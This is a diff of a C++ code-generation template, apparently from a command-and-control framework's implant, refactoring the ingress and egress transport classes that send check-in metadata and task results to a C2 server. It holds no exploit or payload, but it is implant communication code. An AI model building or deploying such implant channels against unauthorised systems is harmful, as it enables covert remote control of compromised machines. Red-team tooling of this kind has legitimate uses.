@@ -70,26 +70,21 @@ protected:
 
 // Forward declarations of GET functions from comms.cpp
 
-[%- for c2_get_profile in get_function_mappings.values() %]
+[%- for profile_name, ns in profile_mappings.items() %]
 
-std::vector<uint8_t> [[ c2_get_profile.value]]::get(std::vector<uint8_t> metadata_as_msgpack);
-
-[%- endfor %]
-
-// Forward declarations of POST functions from comms.cpp
-
-[%- for c2_post_profile in post_function_mappings.values() %]
-
-int [[ c2_post_profile.value]]::post(std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list);
+namespace [[ ns ]] {
+    std::vector<uint8_t> get(std::vector<uint8_t> metadata_as_msgpack);
+    int post(std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list);
+}
 
 [%- endfor %]
-
 
 //Declare classes for each comms type
 
-[%- for c2_get_profile in get_function_mappings.values() %]
+[%- for profile_name, ns in profile_mappings.items() %]
 
-class [[ c2_get_profile.value ]]_class : public IIngressTransport {
+// GET for [[ profile_name ]]
+class [[ ns ]]_Ingress : public IIngressTransport {
 public:
     //return NULL on non pipe/handle returning transport methods.
     //parent loop handles this by reverting to a wait for single, which waits
@@ -147,7 +142,7 @@ public:
         get_as_msgpack = this->pack_to_msgpack(get_array);
 
         //send checkin
-        std::vector<uint8_t> response = [[ c2_get_profile.value ]]::get(get_as_msgpack);
+        std::vector<uint8_t> response = [[ ns ]]::get(get_as_msgpack);
 
         nlohmann::json task_array = nlohmann::json::array();
         if (!response.empty()) {
@@ -161,20 +156,19 @@ public:
 
 };
 
-[%- endfor %]
-
-[%- for c2_post_profile in post_function_mappings.values() %]
-
-class [[ c2_post_profile.value ]]_class : public IEgressTransport {
+// POST for [[ profile_name ]]
+class [[ ns ]]_Egress : public IEgressTransport {
 public:
 	void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
         std::vector<uint8_t> task_response_msgpack_list = this->pack_to_msgpack(task_response_array);
 
-		[[ c2_post_profile.value ]]::post(uuid, task_response_msgpack_list);
+		[[ ns ]]::post(uuid, task_response_msgpack_list);
 	}
 };
 
+
 [%- endfor %]
+
 
 
 /* endtemplate */
